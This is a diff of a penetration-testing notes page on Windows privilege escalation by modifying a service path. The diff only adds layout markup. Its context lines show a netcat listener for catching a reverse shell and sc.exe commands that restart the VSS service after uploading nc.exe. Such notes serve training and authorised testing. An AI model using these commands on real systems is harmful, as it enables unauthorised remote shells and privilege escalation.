@@ -7,10 +7,19 @@ tags: ["built-in group", "active driectory", "ad", "Windows", "privesc"]
 ---
 #### Abuse #1. Modify Service Path
 
+<div>
+
 ```bash
 # Start a nc listener
 rlwrap nc -lvnp 443
 ```
+
+</div>
+
+{{< tab set1 tab1 active >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```powershell
 # Assumed nc.exe is uploaded
@@ -26,5 +35,9 @@ sc.exe stop VSS
 # Start service
 sc.exe start VSS
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
